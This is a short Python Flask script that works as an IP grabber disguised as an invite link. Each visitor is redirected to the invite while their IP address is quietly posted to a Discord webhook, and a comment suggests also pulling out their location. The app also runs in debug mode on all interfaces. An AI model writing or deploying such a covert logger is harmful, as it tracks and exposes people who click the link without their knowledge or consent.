'''
Redirects the user and logs their ip
'''
import os
import requests
from dotenv import load_dotenv
from flask import Flask, request, redirect

load_dotenv()

app = Flask(__name__)
INVITE_LINK = os.getenv('INVITE_LINK')
WEBHOOK_LINK = os.getenv('WEBHOOK_LINK')


def post_ip(ip_addr):
    '''
    Posts the ip to discord
    '''
    embed = {
        'title': 'Invite IP Log',
        'fields': [
            {
                'name': 'IP',
                'value': ip_addr
            }
        ]
    }

    # you can add more like pull out location
    requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)


@app.route('/')
def invite():
    '''
    Logs the visitor's ip, sends it to discord 
    via webhooks and redirects to the invite link
    '''
    ip_addr = request.remote_addr
    post_ip(ip_addr)

    return redirect(INVITE_LINK)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
